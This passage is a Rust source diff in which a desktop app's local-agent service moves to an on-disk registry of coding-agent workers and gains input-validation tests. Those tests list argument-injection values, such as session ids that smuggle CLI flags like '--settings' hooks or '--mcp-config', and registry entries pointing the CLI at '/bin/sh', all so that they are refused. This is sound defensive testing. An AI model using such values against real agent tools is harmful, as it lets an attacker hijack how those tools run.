                     detect: self.l4.detect.clone(),
                 });
             }
@@ -1197,16 +1598,52 @@ impl Actor {
     }
 
     /// Record `session_id` for `job_id`? Not for a worker job unless it is a
-    /// worker session ([`is_worker_session`]): it would reach the CLI.
+    /// worker session ([`is_worker_session`]): only such an id is ever sent
+    /// back to a worker's adapter.
     pub(super) fn accepts_session(&self, job_id: &str, session_id: &str) -> bool {
         let worker = self.state.job(job_id).is_some_and(|j| j.worker.is_some());
         if worker && !is_worker_session(session_id) {
             crate::log_to_file(&format!(
-                "[local-agent:{job_id}] ignoring a worker session id that isn't a UUID"
+                "[local-agent:{job_id}] ignoring a worker session id outside [A-Za-z0-9._:-] (1 to 256)"
             ));
             return false;
         }
         true
+    }
+
+    /// The person said yes to `worker` in the folder shared as `grant_path`
+    /// ([`starts`](super::starts)), and that is still that folder: its
+    /// realpath now is the grant's path (a folder replaced by a link to
+    /// somewhere else isn't), and the worker is switched on.
+    pub(super) fn worker_remembered(&self, worker: &str, grant_path: &str) -> bool {
+        self.l4.stored.allowed(worker)
+            && yes_folder(grant_path).is_some_and(|f| self.l4.stored.remembers(worker, &f))
+    }
+
+    /// Remember the person's yes to `worker` in the folder shared as
+    /// `grant_path` (its realpath now, if that is still the grant's path), in
+    /// model.json: written by Rust only, never sent to or read from the page.
+    pub(super) fn remember_worker_folder(&mut self, worker: &str, grant_path: &str) {
+        // Only while it is switched on: a yes clicked after the person
+        // switched it off (its folders forgotten) must not bring one back.
+        if !self.l4.stored.allowed(worker) {
+            crate::log_to_file(&format!("[local-agent] not remembering a yes for {worker}: it is switched off"));
+            return;
+        }
+        let Some(folder) = yes_folder(grant_path).filter(|_| is_worker_id(worker)) else {
+            crate::log_to_file(&format!("[local-agent] not remembering a yes for {worker}: {grant_path} isn't that folder now"));
+            return;
+        };
+        if self.l4.stored.remembers(worker, &folder) {
+            return;
+        }
+        let mut stored = self.l4.stored.clone();
+        stored
+            .worker_folders
+            .push(serde_json::json!({ "worker": worker, "folder": folder }));
+        if let Err(e) = self.save_l4(stored) {
+            crate::log_to_file(&format!("[local-agent] the yes for {worker} in {folder} isn't remembered: {e}"));
+        }
     }
 
     /// The app log says what was found, when it changes.
@@ -1281,33 +1718,51 @@ impl Actor {
         Ok(())
     }
 
-    /// The tray's Coding Agents menu. A yes needs a bundle that runs workers;
-    /// taking it back stops (or parks) that worker's jobs.
-    fn allow_worker(&mut self, worker: Worker, allowed: bool) -> Result<(), String> {
+    /// The tray's Coding Agents menu, by id. A yes needs a bundle that runs
+    /// workers and lists this one in its registry; taking it back (any id)
+    /// stops (or parks) that worker's jobs.
+    fn allow_worker(&mut self, id: &str, allowed: bool) -> Result<(), String> {
         if !self.enabled {
             return Err("unavailable in this build".into());
         }
-        if allowed && !self.l4.found.caps.workers {
-            return Err(format!("this build of Native Intelligence can't run {} yet", worker.name()));
+        check_worker_id(id)?;
+        let listed = self.l4.found.registry.as_ref().and_then(|r| r.get(id)).cloned();
+        if allowed && (!self.l4.found.caps.workers || listed.is_none()) {
+            return Err(NO_WORKERS.into());
         }
+        let name = listed.map_or_else(|| id.to_string(), |w| w.label);
         let mut stored = self.l4.stored.clone();
-        stored.allowed_workers.retain(|w| w != worker.as_str());
+        stored.allowed_workers.retain(|w| w != id);
         if allowed {
-            stored.allowed_workers.push(worker.as_str().into());
+            stored.allowed_workers.push(id.to_string());
+        } else {
+            // Switched off: every folder it had a yes for is forgotten, so
+            // switching it on again asks afresh.
+            stored
+                .worker_folders
+                .retain(|e| e.get("worker").and_then(Value::as_str) != Some(id));
         }
         if stored == self.l4.stored {
             return Ok(());
         }
-        self.save_l4(stored)?;
+        if let Err(e) = self.save_l4(stored.clone()) {
+            if allowed {
+                return Err(e);
+            }
+            // Off holds for this run of the app even when it can't be saved
+            // (a full disk): never leave the agent on against the click.
+            crate::log_to_file(&format!(
+                "[local-agent] {name} is off for now, but that couldn't be saved ({e}): it may be on again after a relaunch"
+            ));
+            self.l4.stored = stored;
+            self.l4.refresh_view();
+        }
         crate::log_to_file(&format!(
-            "[local-agent] {} is {} on this Mac",
-            worker.name(),
+            "[local-agent] {name} is {} on this Mac",
             if allowed { "allowed" } else { "no longer allowed" }
         ));
         if !allowed {
-            self.stop_jobs_where(&format!("{} is no longer allowed", worker.name()), |j| {
-                j.worker.as_deref() == Some(worker.as_str())
-            });
+            self.stop_jobs_where(&format!("{name} is no longer allowed"), |j| j.worker.as_deref() == Some(id));
         }
         Ok(())
     }
@@ -1353,11 +1808,11 @@ impl Actor {
             return Err(CHANGED.into());
         }
         let recorded = self.state.job(job_id).and_then(|j| j.worker.clone());
-        if recorded.as_deref() != run.worker.as_ref().map(|w| w.worker.as_str()) {
+        if recorded.as_deref() != run.worker.as_ref().map(|w| w.worker.id.as_str()) {
             return Err(CHANGED.into());
         }
         if let Some(w) = &run.worker {
-            if !self.l4.stored.allowed(w.worker) || !run.model.is_relay() {
+            if !self.l4.stored.allowed(&w.worker.id) || !run.model.is_relay() {
                 return Err(CHANGED.into());
             }
         }
@@ -1386,10 +1841,24 @@ impl LocalAgentService {
         self.ask(|reply| super::Cmd::Workers(Cmd::Set { choice, reply })).await?
     }
 
-    /// The tray's Coding Agents menu (native only: no command calls it).
-    pub(crate) async fn allow_worker(&self, worker: Worker, allowed: bool) -> Result<(), String> {
+    /// Tests elsewhere in local_agent: the person's yes to a worker, as the
+    /// tray gives it (tests/app_commands.rs keeps the real call to the tray).
+    #[cfg(test)]
+    pub(super) async fn allow_worker_as_tray(&self, worker: &str) -> Result<(), String> {
+        self.allow_worker(worker.to_string(), true).await
+    }
+
+    /// The tray's Coding Agents menu, by id (native only: no command calls it).
+    pub(crate) async fn allow_worker(&self, worker: String, allowed: bool) -> Result<(), String> {
         self.ask(|reply| super::Cmd::Workers(Cmd::Allow { worker, allowed, reply }))
             .await?
+    }
+
+    /// `local_agent_status`'s `workers`: what a start may name right now.
+    pub(super) async fn offered_workers(&self) -> Vec<WorkerOffer> {
+        self.ask(|reply| super::Cmd::Workers(Cmd::Offered { reply }))
+            .await
+            .unwrap_or_default()
     }
 
     async fn precheck(&self, job_id: Option<String>) -> Result<Precheck, String> {
@@ -1399,23 +1868,28 @@ impl LocalAgentService {
     /// Before a start: the model and worker it would run on, checked here,
     /// before a slot is taken, an idle job parked or a worktree made. `None`:
     /// the job already runs (the start is a no-op; nothing is looked at).
+    /// The worker named, or the one the job keeps, is looked up in the
+    /// bundle's registry on disk: an id it doesn't list is refused.
     pub(super) async fn check_start(&self, args: &Checked, launch: &LaunchConfig) -> Result<Option<RunSpec>, String> {
         let pre = self.precheck(args.job_id.clone()).await?;
+        // The job's worker: the one it keeps, else the one this start names.
+        let worker = pre.recorded.clone().or_else(|| args.worker.clone());
+        let bundle = BundleWorkers::read(launch, worker.is_some());
+        // Even for a job that runs (the start is then a no-op): a start may
+        // not name another worker.
+        if pre.exists {
+            check_same_worker(pre.recorded.as_deref(), args.worker.as_deref(), |r| bundle.label(r))?;
+        }
         if pre.live {
             return Ok(None);
         }
-        if pre.exists {
-            check_same_worker(pre.recorded.as_deref(), args.worker)?;
-        }
-        let worker = match &pre.recorded {
-            Some(r) => Some(Worker::parse(r).map_err(|_| format!("this job runs on a worker this Native Intelligence doesn't know ({r})"))?),
-            None => args.worker,
-        };
         if worker.is_some() {
             let asked = args.resume.as_ref().map(|r| r.eve_session_id.as_str());
             check_worker_resume(asked, pre.session.as_deref())?;
         }
-        self.plan_run(pre, worker, args.local_model, launch).await.map(Some)
+        self.plan_run(pre, worker.as_deref(), bundle, args.local_model, launch)
+            .await
+            .map(Some)
     }
 
     /// Hand the checked run to the actor for `job_id`'s launch.
@@ -1428,43 +1902,43 @@ impl LocalAgentService {
         }
     }
 
-    /// Before a resume: the same checks, on the job's own worker.
+    /// Before a resume: the same checks, on the job's own worker, which it
+    /// answers (from the registry) for the resume's confirm.
     pub(super) async fn check_resume(
         &self,
         job_id: &str,
         local_model: Option<bool>,
         launch: &LaunchConfig,
-    ) -> Result<(), String> {
+    ) -> Result<Option<Worker>, String> {
         let pre = self.precheck(Some(job_id.to_string())).await?;
         if pre.live {
             // The resume itself says it's already running.
-            return Ok(());
+            return Ok(None);
         }
-        let worker = match &pre.recorded {
-            Some(r) => Some(Worker::parse(r).map_err(|_| format!("this job runs on a worker this Native Intelligence doesn't know ({r})"))?),
-            None => None,
-        };
+        let worker = pre.recorded.clone();
+        let bundle = BundleWorkers::read(launch, worker.is_some());
         if worker.is_some() {
             check_worker_resume(None, pre.session.as_deref())?;
         }
-        let run = self.plan_run(pre, worker, local_model, launch).await?;
+        let run = self.plan_run(pre, worker.as_deref(), bundle, local_model, launch).await?;
+        let worker = run.worker.as_ref().map(|w| w.worker.clone());
         self.stash_run(job_id, Some(run));
-        Ok(())
+        Ok(worker)
     }
 
     async fn plan_run(
         &self,
         pre: Precheck,
-        worker: Option<Worker>,
+        worker: Option<&str>,
+        bundle: BundleWorkers,
         local_model: Option<bool>,
         launch: &LaunchConfig,
     ) -> Result<RunSpec, String> {
         let model = pre.choice?;
         check_mode(local_model, &model)?;
-        let caps = bundle_caps(Path::new(&launch.agent_dir));
-        let Some(worker) = worker else {
+        let Some(id) = worker else {
             if let ModelChoice::Local { server, model: id } = &model {
-                if !caps.local_model {
+                if !bundle.caps.local_model {
                     return Err(NO_LOCAL_SUPPORT.into());
                 }
                 let found = (pre.detect)().await;
@@ -1477,59 +1951,143 @@ impl LocalAgentService {
             }
             return Ok(RunSpec { model, worker: None });
         };
-        let name = worker.name();
+        // Only an agent the bundle on disk lists: never one the page made up.
+        let worker = bundle.registry.as_ref().ok_or(NO_WORKERS)?.resolve(id)?.clone();
+        let name = &worker.label;
         if !model.is_relay() {
             return Err(format!(
                 "this Mac uses a local model: the model runs here, and Native Intelligence tools still go through Native Intelligence. To use \
                  {name}, pick Native Intelligence in {WHERE}"
             ));
         }
-        if !pre.allowed.contains(&worker) {
+        if !pre.allowed.iter().any(|a| a == id) {
             return Err(format!("{name} isn't allowed on this Mac; the person can allow it in {WORKERS_WHERE}"));
         }
-        let adapter = adapter_path(launch, worker);
-        if !caps.workers || !adapter.is_file() {
-            return Err(format!("this build of Native Intelligence can't run {name} yet"));
-        }
-        let Some(bin) = find_cli(&launch.tool_path, worker.cli()) else {
+        let Some(bin) = find_cli(&launch.tool_path, &worker.cli) else {
             return Err(format!(
                 "{name} isn't installed on this Mac: there's no `{}` on your login shell's PATH. Native Intelligence doesn't \
                  install it; install it yourself, then start the job again",
-                worker.cli()
+                worker.cli
             ));
         };
         let bin = bin
             .to_str()
-            .ok_or_else(|| format!("the path of `{}` is not valid UTF-8", worker.cli()))?
+            .ok_or_else(|| format!("the path of `{}` is not valid UTF-8", worker.cli))?
+            .to_string();
+        let acp_dir = bundle
+            .files
+            .acp_dir
+            .to_str()
+            .ok_or("the local agent bundle's path is not valid UTF-8")?
             .to_string();
         Ok(RunSpec {
             model,
-            worker: Some(WorkerRun { worker, adapter, bin }),
+            worker: Some(WorkerRun {
+                worker,
+                adapter: bundle.files.adapter,
+                acp_dir,
+                bin,
+                fence_dir: String::new(),
+                closed_ports: Vec::new(),
+                tools_file: None,
+            }),
         })
     }
 }
 
+/// A worker's adapter, CLI and agents' adapters for `launch`, without the
+/// launch's checks (the yes, the model): for `--return-logins` on a job that
+/// isn't running ([`super::fence`]). `fence_dir` is left for the caller.
+pub(super) fn login_run_for(launch: &LaunchConfig, id: &str) -> Result<WorkerRun, String> {
+    let bundle = BundleWorkers::read(launch, true);
+    let worker = bundle.registry.as_ref().ok_or(NO_WORKERS)?.resolve(id)?.clone();
+    let bin = find_cli(&launch.tool_path, &worker.cli)
+        .ok_or_else(|| format!("there's no `{}` on the login shell's PATH", worker.cli))?
+        .to_str()
+        .ok_or("the CLI's path is not valid UTF-8")?
+        .to_string();
+    let acp_dir = bundle
+        .files
+        .acp_dir
+        .to_str()
+        .ok_or("the local agent bundle's path is not valid UTF-8")?
+        .to_string();
+    Ok(WorkerRun {
+        worker,
+        adapter: bundle.files.adapter,
+        acp_dir,
+        bin,
+        fence_dir: String::new(),
+        closed_ports: Vec::new(),
+        tools_file: None,
+    })
+}
+
+/// What a launch's bundle offers workers: its capabilities, where their
+/// files are, and its registry when it runs workers and has all of them.
+struct BundleWorkers {
+    caps: Caps,
+    files: WorkerFiles,
+    registry: Option<Registry>,
+}
+
+impl BundleWorkers {
+    /// `needed`: a worker is involved (else the registry isn't read).
+    fn read(launch: &LaunchConfig, needed: bool) -> BundleWorkers {
+        let caps = bundle_caps(Path::new(&launch.agent_dir));
+        let files = WorkerFiles::for_launch(launch);
+        let registry = (needed && caps.workers).then(|| files.registry_if_complete()).flatten();
+        BundleWorkers { caps, files, registry }
+    }
+
+    fn label(&self, id: &str) -> Option<String> {
+        self.registry.as_ref()?.get(id).map(|w| w.label.clone())
+    }
+}
+
+/// The registry of the bundle `resolved` names, when it has everything a
+/// worker needs (its capability aside: the tray still names a worker the
+/// person allowed by it).
+fn resolved_registry(resolved: &super::config::Resolved) -> Option<Registry> {
+    let dir = resolved.agent_dir.as_deref()?;
+    WorkerFiles::for_agent(dir, !resolved.packaged).registry_if_complete()
+}
+
 /// Look every [`WATCH_EVERY`] while a folder is shared and local agents are
-/// on: the bundle's capabilities, the servers and the CLIs, so the tray's
-/// submenus come and go with them. Spawned once by
-/// [`LocalAgentService::spawn`]; ends with the actor.
+/// on: the bundle's capabilities, the servers, the registry and the CLIs, so
+/// the tray's submenus come and go with them. Before that, the registry
+/// alone, once, so the tray names the workers the person allowed. Spawned
+/// once by [`LocalAgentService::spawn`]; ends with the actor.
 pub(super) async fn watch(cmds: mpsc::UnboundedSender<super::Cmd>, resolver: Arc<Resolver>) {
+    let first = resolved_registry(&resolver.resolve(false).await);
+    if cmds.send(super::Cmd::Workers(Cmd::Registry(first))).is_err() {
+        return;
+    }
     let look = move || {
         let resolver = resolver.clone();
         async move {
-            let caps = resolver
-                .resolve(false)
-                .await
-                .agent_dir
-                .map_or_else(Caps::default, |d| bundle_caps(&d));
+            let resolved = resolver.resolve(false).await;
+            let caps = resolved.agent_dir.as_deref().map_or_else(Caps::default, bundle_caps);
+            let registry = resolved_registry(&resolved);
             let servers = if caps.local_model { Some(detect_all().await) } else { None };
-            let clis = if caps.workers {
-                let path = resolver.shell_path().await;
-                Worker::ALL.into_iter().filter(|w| find_cli(&path, w.cli()).is_some()).collect()
-            } else {
-                Vec::new()
+            let clis = match registry.as_ref().filter(|_| caps.workers) {
+                Some(registry) => {
+                    let path = resolver.shell_path().await;
+                    registry
+                        .workers()
+                        .iter()
+                        .filter(|w| find_cli(&path, &w.cli).is_some())
+                        .map(|w| w.id.clone())
+                        .collect()
+                }
+                None => Vec::new(),
             };
-            Found { caps, servers, clis }
+            Found {
+                caps,
+                servers,
+                registry,
+                clis,
+            }
         }
     };
     watch_with(cmds, WATCH_EVERY, look).await;
@@ -1605,14 +2163,137 @@ mod tests {
         workers: true,
     };
 
+    /// The shape of the bundle's `workers/registry.json` (two of its entries
+    /// as the adapter's registry has them).
+    const REGISTRY: &str = r#"{
+      "codex": {
+        "label": "Codex",
+        "cli": "codex",
+        "command": ["$NODE", "$ACP_DIR/node_modules/@agentclientprotocol/codex-acp/dist/index.js"],
+        "env": { "CODEX_PATH": "$CLI" },
+        "sessionMode": "agent-full-access",
+        "login": { "sharedState": [".codex"] },
+        "signInHint": "Codex isn't signed in on this Mac.",
+        "packages": { "@agentclientprotocol/codex-acp": "2.6.0" }
+      },
+      "claude-code": {
+        "label": "Claude Code",
+        "cli": "claude",
+        "command": ["$NODE", "$ACP_DIR/node_modules/@agentclientprotocol/claude-agent-acp/dist/index.js"],
+        "env": { "CLAUDE_CODE_EXECUTABLE": "$CLI" },
+        "login": { "keychain": true },
+        "signInHint": "Claude Code isn't signed in on this Mac.",
+        "packages": { "@agentclientprotocol/claude-agent-acp": "0.107.0" }
+      }
+    }"#;
+
+    fn registry() -> Registry {
+        Registry::parse(REGISTRY.as_bytes()).unwrap()
+    }
+
+    fn worker(id: &str) -> Worker {
+        registry().get(id).unwrap().clone()
+    }
+
     #[test]
-    fn workers_and_servers_have_one_name_each() {
-        for w in Worker::ALL {
-            assert_eq!(Worker::parse(w.as_str()), Ok(w));
-            assert_eq!(serde_json::to_value(w).unwrap(), w.as_str());
+    fn the_registry_is_the_bundles_agents_by_id() {
+        let r = registry();
+        let ids: Vec<&str> = r.workers().iter().map(|w| w.id.as_str()).collect();
+        assert_eq!(ids, ["claude-code", "codex"], "sorted by id");
+        assert_eq!(
+            worker("claude-code"),
+            Worker {
+                id: "claude-code".into(),
+                label: "Claude Code".into(),
+                cli: "claude".into(),
+            }
+        );
+        assert_eq!(r.resolve("codex").map(|w| w.cli.as_str()), Ok("codex"));
+        // An id the page sends that the registry doesn't list is refused.
+        for unknown in ["cursor", "claude", "Codex", ""] {
+            assert_eq!(
+                r.resolve(unknown),
+                Err("worker must be one of \"claude-code\", \"codex\"".into()),
+                "{unknown}"
+            );
         }
-        assert_eq!((Worker::ClaudeCode.cli(), Worker::Codex.cli()), ("claude", "codex"));
-        assert!(Worker::parse("claude").is_err() && Worker::parse("Codex").is_err() && Worker::parse("").is_err());
+        // Only `label` and `cli` are Rust's: the rest is the adapter's.
+        let lean = Registry::parse(br#"{"gemini":{"label":"Gemini CLI","cli":"gemini"}}"#).unwrap();
+        assert_eq!(lean.get("gemini").unwrap().label, "Gemini CLI");
+    }
+
+    #[test]
+    fn a_malformed_registry_is_refused_whole() {
+        let entry = |id: &str, label: &str, cli: &str| format!(r#"{{"{id}":{{"label":"{label}","cli":"{cli}"}}}}"#);
+        let ok = entry("claude-code", "Claude Code", "claude");
+        assert!(Registry::parse(ok.as_bytes()).is_ok());
+        let long = "a".repeat(MAX_LABEL + 1);
+        let many: String = format!(
+            "{{{}}}",
+            (0..=MAX_WORKERS)
+                .map(|i| format!(r#""w{i}":{{"label":"W","cli":"w"}}"#))
+                .collect::<Vec<_>>()
+                .join(",")
+        );
+        for bad in [
+            "".to_string(),
+            "{ not json".into(),
+            "[]".into(),
+            "\"claude-code\"".into(),
+            "{}".into(),
+            many,
+            r#"{"claude-code":"Claude Code"}"#.into(),
+            r#"{"claude-code":{"cli":"claude"}}"#.into(),
+            r#"{"claude-code":{"label":"Claude Code"}}"#.into(),
+            r#"{"claude-code":{"label":7,"cli":"claude"}}"#.into(),
+            // Ids as the adapter's registry has them, and nothing else.
+            entry("Claude", "Claude Code", "claude"),
+            entry("-x", "X", "x"),
+            entry("../x", "X", "x"),
+            entry(&"a".repeat(33), "X", "x"),
+            // A CLI is a name on PATH: never a path or a flag.
+            entry("x", "X", "/usr/local/bin/claude"),
+            entry("x", "X", "../claude"),
+            entry("x", "X", "-claude"),
+            entry("x", "X", ".claude"),
+            entry("x", "X", "cl aude"),
+            // A label is shown in the tray and in a native confirm: plain words.
+            entry("x", "", "x"),
+            entry("x", &long, "x"),
+            entry("x", " Claude", "x"),
+            entry("x", "Claude  Code", "x"),
+            entry("x", "Claude\\nCode", "x"),
+            entry("x", "Claude\u{202e}Code", "x"),
+            entry("x", "Claude: Code?", "x"),
+        ] {
+            assert!(Registry::parse(bad.as_bytes()).is_err(), "{bad}");
+        }
+        // A key twice, at the top or in an entry: never "the last one wins".
+        for dup in [
+            r#"{"codex":{"label":"Codex","cli":"codex"},"codex":{"label":"Codex","cli":"/bin/sh"}}"#,
+            r#"{"codex":{"label":"Codex","cli":"codex","cli":"sh"}}"#,
+            r#"{"codex":{"label":"Codex","cli":"codex","login":{"keychain":true,"keychain":false}}}"#,
+        ] {
+            let err = Registry::parse(dup.as_bytes()).unwrap_err();
+            assert!(err.contains("appears twice"), "{dup}: {err}");
+        }
+        // One bad entry takes every worker with it.
+        let mixed = r#"{"claude-code":{"label":"Claude Code","cli":"claude"},"x":{"label":"X","cli":"/bin/x"}}"#;
+        assert!(Registry::parse(mixed.as_bytes()).is_err());
+    }
+
+    #[test]
+    fn a_start_names_a_worker_by_an_id_of_the_registrys_shape() {
+        for ok in ["claude-code", "codex", "a", "gemini-2", &"a".repeat(32)] {
+            assert!(is_worker_id(ok) && check_worker_id(ok).is_ok(), "{ok}");
+        }
+        for bad in ["", "Codex", "2x", "-x", "claude_code", "claude code", "../codex", &"a".repeat(33)] {
+            assert_eq!(check_worker_id(bad), Err("worker is not a coding agent's id".into()), "{bad}");
+        }
+    }
+
+    #[test]
+    fn servers_have_one_name_each() {
         for s in LocalServer::ALL {
             assert_eq!(LocalServer::parse(s.as_str()), Some(s));
             assert_eq!(serde_json::to_value(s).unwrap(), s.as_str());
@@ -1653,6 +2334,7 @@ mod tests {
         let newer = Stored {
             model: Some(serde_json::json!({ "kind": "local", "server": "vllm", "model": "m" })),
             allowed_workers: vec!["codex".into(), "cursor".into()],
+            worker_folders: vec![serde_json::json!({ "worker": "codex", "folder": "/Users/x/site" }), serde_json::json!("newer")],
         };
         newer.save(&path).unwrap();
         assert_eq!(Stored::load(&path), newer, "a newer Native Intelligence's values survive");
@@ -1661,7 +2343,7 @@ mod tests {
             use std::os::unix::fs::PermissionsExt;
             assert_eq!(std::fs::metadata(&path).unwrap().permissions().mode() & 0o777, 0o600);
         }
-        assert!(newer.allowed(Worker::Codex) && !newer.allowed(Worker::ClaudeCode));
+        assert!(newer.allowed("codex") && !newer.allowed("claude-code"));
         std::fs::write(&path, "{ not json").unwrap();
         let broken = Stored::load(&path);
         assert!(ModelChoice::from_stored(broken.model.as_ref()).is_err(), "unreadable: never the relay");
@@ -1907,19 +2589,36 @@ mod tests {
     const UUID: &str = "0199a213-81c0-7800-8aa1-bbab2a035a53";
 
     #[test]
-    fn a_worker_session_is_a_canonical_lowercase_uuid_and_nothing_else() {
-        assert!(is_worker_session(UUID));
+    fn a_worker_session_is_the_adapters_shape_and_never_a_flag() {
+        let longest = "s".repeat(MAX_WORKER_SESSION);
+        for ok in [
+            UUID,
+            "0199A213-81C0-7800-8AA1-BBAB2A035A53",
+            "urn:uuid:0199a213-81c0-7800-8aa1-bbab2a035a53",
+            "0199a21381c078008aa1bbab2a035a53",
+            "ses-0199a213-81c0-7800-8aa1-bbab2a035a53",
+            "thread_01.abc:2",
+            "7",
+            longest.as_str(),
+        ] {
+            assert!(is_worker_session(ok), "{ok}");
+        }
+        let too_long = "s".repeat(MAX_WORKER_SESSION + 1);
         for bad in [
             "",
             "--settings={\"hooks\":{}}",
             "--mcp-config=/tmp/x.json",
             "-x",
             "--last",
-            "0199A213-81C0-7800-8AA1-BBAB2A035A53",
+            ".hidden",
+            ":x",
+            "_x",
             "{0199a213-81c0-7800-8aa1-bbab2a035a53}",
-            "urn:uuid:0199a213-81c0-7800-8aa1-bbab2a035a53",
-            "0199a21381c078008aa1bbab2a035a53",
-            "ses-0199a213-81c0-7800-8aa1-bbab2a035a53",
+            "a b",
+            "a/b",
+            "a\nb",
+            "caf\u{e9}",
+            too_long.as_str(),
         ] {
             assert!(!is_worker_session(bad), "{bad}");
         }
@@ -1932,6 +2631,7 @@ mod tests {
         assert_eq!(check_worker_resume(Some(UUID), Some(UUID)), Ok(()), "the server names this Mac's own");
         let other = "11111111-2222-4333-8444-555555555555";
         let upper = UUID.to_uppercase();
+        // Of the right shape or not, an id this Mac didn't record is refused.
         for asked in ["--settings={\"hooks\":{}}", "-x", "--last", upper.as_str(), "not-a-uuid", other] {
             assert_eq!(check_worker_resume(Some(asked), Some(UUID)), Err(FOREIGN_SESSION.into()), "{asked}");
             assert_eq!(check_worker_resume(Some(asked), None), Err(FOREIGN_SESSION.into()), "{asked}");
@@ -1942,17 +2642,34 @@ mod tests {
 
     #[test]
     fn a_start_may_not_switch_a_jobs_worker() {
-        assert_eq!(check_same_worker(None, None), Ok(()));
-        assert_eq!(check_same_worker(Some("codex"), None), Ok(()), "absent: the job's own");
-        assert_eq!(check_same_worker(Some("codex"), Some(Worker::Codex)), Ok(()));
+        let r = registry();
+        let label = |id: &str| r.get(id).map(|w| w.label.clone());
+        assert_eq!(check_same_worker(None, None, label), Ok(()));
+        assert_eq!(check_same_worker(Some("codex"), None, label), Ok(()), "absent: the job's own");
+        assert_eq!(check_same_worker(Some("codex"), Some("codex"), label), Ok(()));
         assert_eq!(
-            check_same_worker(Some("codex"), Some(Worker::ClaudeCode)),
+            check_same_worker(Some("codex"), Some("claude-code"), label),
             Err("this job runs on Codex".into())
         );
         assert_eq!(
-            check_same_worker(None, Some(Worker::Codex)),
+            check_same_worker(Some("cursor"), Some("codex"), label),
+            Err("this job runs on another coding agent".into()),
+            "a worker this registry doesn't list"
+        );
+        assert_eq!(
+            check_same_worker(None, Some("codex"), label),
             Err("this job runs on Native Intelligence's agent".into())
         );
+        // The actor's check that the handler's lookup is still the job's.
+        assert_eq!(same_worker(None, None), Ok(None));
+        assert_eq!(same_worker(Some("codex"), Some(worker("codex"))), Ok(Some(worker("codex"))));
+        for (id, found) in [
+            (Some("codex"), None),
+            (None, Some(worker("codex"))),
+            (Some("claude-code"), Some(worker("codex"))),
+        ] {
+            assert_eq!(same_worker(id, found), Err(CHANGED.into()));
+        }
     }
 
     fn launch_config(base: &Path) -> LaunchConfig {
@@ -2043,15 +2760,43 @@ mod tests {
         let run = RunSpec {
             model: ModelChoice::Relay,
             worker: Some(WorkerRun {
-                worker: Worker::Codex,
-                adapter: dir.path().join("agent/workers/codex.sh"),
+                worker: worker("codex"),
+                adapter: dir.path().join("agent/workers/acp.sh"),
+                acp_dir: dir.path().join("agent/acp").to_str().unwrap().into(),
                 bin: "/opt/homebrew/bin/codex".into(),
+                fence_dir: "/d/local-agent/fence".into(),
+                closed_ports: vec![4123, 8799],
+                tools_file: None,
             }),
         };
-        let exact = with(&["LOCAL_AGENT_WORKER", "LOCAL_AGENT_WORKER_BIN"]);
+        let exact = with(&[
+            "LOCAL_AGENT_WORKER",
+            "LOCAL_AGENT_WORKER_BIN",
+            "LOCAL_AGENT_ACP_DIR",
+            "LOCAL_AGENT_FENCE_DIR",
+            "LOCAL_AGENT_CLOSED_PORTS",
+        ]);
         assert_eq!(env_keys(&launch, &run, true), exact, "no session token");
         assert_eq!(env_keys(&launch, &run, false), exact, "no dev key");
-        assert_eq!(run.entry(&launch), dir.path().join("agent/workers/codex.sh"));
+        let mut env = vec![
+            ("LOCAL_AGENT_MODEL_BASE_URL".to_string(), "x".to_string()),
+            ("LOCAL_AGENT_MODEL_TOKEN".to_string(), "t".to_string()),
+            ("LOCAL_AGENT_DEV_ENV_FILE".to_string(), "/w/.env.local".to_string()),
+        ];
+        run.apply(&mut env, &launch);
+        let acp = dir.path().join("agent/acp").display().to_string();
+        assert_eq!(
+            env,
+            vec![
+                ("LOCAL_AGENT_WORKER".to_string(), "codex".to_string()),
+                ("LOCAL_AGENT_WORKER_BIN".to_string(), "/opt/homebrew/bin/codex".to_string()),
+                ("LOCAL_AGENT_ACP_DIR".to_string(), acp),
+                ("LOCAL_AGENT_FENCE_DIR".to_string(), "/d/local-agent/fence".to_string()),
+                ("LOCAL_AGENT_CLOSED_PORTS".to_string(), "4123,8799".to_string()),
+            ],
+            "the registry id, the CLI and the agents' adapters; every Native Intelligence credential gone"
+        );
+        assert_eq!(run.entry(&launch), dir.path().join("agent/workers/acp.sh"));
         assert_eq!(RunSpec::default().entry(&launch), launch.launcher);
         assert_eq!(run.describe(true), "Codex at /opt/homebrew/bin/codex");
         // The relay's run is today's, untouched.
@@ -2064,37 +2809,76 @@ mod tests {
     }
 
     #[test]
-    fn the_adapter_is_the_bundles_or_a_checkouts_build_of_it() {
+    fn one_adapter_for_every_worker_in_the_bundle_or_a_checkouts_build() {
         let dir = tempfile::tempdir().unwrap();
         let mut launch = launch_config(dir.path());
         launch.launcher = "/b/launcher/launcher.mjs".into();
         launch.agent_dir = "/b".into();
-        assert_eq!(adapter_path(&launch, Worker::ClaudeCode), PathBuf::from("/b/workers/claude-code.mjs"));
-        // dev.json: the launcher runs from source, the adapter from F-web's build.
+        let bundle = WorkerFiles {
+            adapter: "/b/workers/acp.mjs".into(),
+            registry: "/b/workers/registry.json".into(),
+            acp_dir: "/b/acp".into(),
+        };
+        assert_eq!(WorkerFiles::for_launch(&launch), bundle);
+        assert_eq!(WorkerFiles::for_agent(Path::new("/b"), false), bundle);
+        // dev.json: the launcher runs from source, the workers from the build.
         launch.launcher = "/a/launcher/launcher.ts".into();
         launch.agent_dir = "/a".into();
-        assert_eq!(adapter_path(&launch, Worker::Codex), PathBuf::from("/a/.output/workers/codex.mjs"));
+        let checkout = WorkerFiles {
+            adapter: "/a/.output/workers/acp.mjs".into(),
+            registry: "/a/.output/workers/registry.json".into(),
+            acp_dir: "/a/.output/acp".into(),
+        };
+        assert_eq!(WorkerFiles::for_launch(&launch), checkout);
+        assert_eq!(WorkerFiles::for_agent(Path::new("/a"), true), checkout);
+    }
+
+    #[test]
+    fn workers_need_the_adapter_the_registry_and_the_agents_adapters() {
+        let dir = tempfile::tempdir().unwrap();
+        let files = WorkerFiles::for_agent(dir.path(), false);
+        assert!(!files.present() && files.registry_if_complete().is_none());
+        std::fs::create_dir_all(dir.path().join("workers")).unwrap();
+        std::fs::write(&files.adapter, "").unwrap();
+        std::fs::write(&files.registry, REGISTRY).unwrap();
+        assert!(!files.present(), "no acp folder");
+        assert_eq!(files.registry_if_complete(), None);
+        std::fs::create_dir_all(&files.acp_dir).unwrap();
+        assert_eq!(files.registry_if_complete(), Some(registry()));
+        std::fs::write(&files.registry, r#"{"x":{"label":"X","cli":"/bin/x"}}"#).unwrap();
+        assert_eq!(files.registry_if_complete(), None, "a malformed registry is none");
+        std::fs::write(&files.registry, " ".repeat(MAX_REGISTRY_BYTES as usize + 1)).unwrap();
